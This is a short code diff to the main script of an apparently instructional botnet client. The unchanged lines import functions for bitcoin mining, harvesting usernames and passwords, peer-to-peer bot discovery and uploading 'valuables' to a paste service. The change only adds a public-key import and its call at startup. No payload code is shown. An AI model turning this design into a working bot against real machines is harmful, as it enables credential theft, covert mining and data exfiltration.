@@ -5,6 +5,7 @@ import threading
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
+from lib.public_key import publickey
 
 def p2p_upload(fn):
     sconn = find_bot()
@@ -44,7 +45,7 @@ if __name__ == "__main__":
     # doesn't play around with our "command prompt"
     time.sleep(0.3)
     print("Welcome Mr Bot, enter your command below. Type help for a list of available comamnds.")
-
+    publickey()
     while 1:
         # Naive command loop
         # There are better ways to do this, but the code should be clear
